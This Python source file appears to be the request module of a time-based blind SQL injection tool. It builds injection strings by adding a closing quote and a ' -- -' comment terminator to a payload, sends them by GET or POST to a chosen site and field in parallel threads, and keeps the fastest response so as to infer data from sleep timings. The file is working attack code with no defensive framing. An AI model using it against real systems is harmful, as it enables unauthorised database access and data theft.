import math
import requests

from multiprocessing.dummy import Pool as ThreadPool

number_of_threads = 3

#REQUEST FUNCTION: It makes the last step of the payload creation and than it makes the real request to the server
#		   The request returns the request object with the smollest sleep time

class request_param(object):
	def __init__(self, my_attack, tmp_payload):
		self.my_attack = my_attack
		self.tmp_payload = tmp_payload

def request(my_attack, tmp_payload):
	parameters = []
	for i in range(0,number_of_threads):
		parameters.append(request_param(my_attack, tmp_payload))
	
	res = parallel_requests(parameters)	
	return res

def single_request(req_param):
	comments=""
	quote=""
	if(req_param.my_attack.comments_needed):
		comments=" -- -"
	if(req_param.my_attack.quote_needed):
		quote="'"
	
	payload = req_param.my_attack.known_value + quote + req_param.tmp_payload + comments
		
	if(req_param.my_attack.method == 'GET'):
		if(req_param.my_attack.show_payload):
			print(payload)
		return requests.get(req_param.my_attack.site + "?" + req_param.my_attack.field + '=' + payload)
	elif(req_param.my_attack.method == 'POST'):
		
		if(req_param.my_attack.show_payload):
			print(payload)
		
		data = {
  			req_param.my_attack.field : payload,
  			#add field if request need it
		}
		return requests.post(req_param.my_attack.site, data=data)
	else:
		return 'REQUEST ERROR'

def get_req_min_time(req_list):
	time_list = []
	for i in range(len(req_list)):
		time_list.append(req_list[i].elapsed.total_seconds())
	index = time_list.index(min(time_list))
	return req_list[index]

def parallel_requests(myparam):
    pool = ThreadPool(number_of_threads)
    results = pool.map( single_request, myparam )
    pool.close()
    pool.join()
    request_min_time = get_req_min_time(results)
    return request_min_time

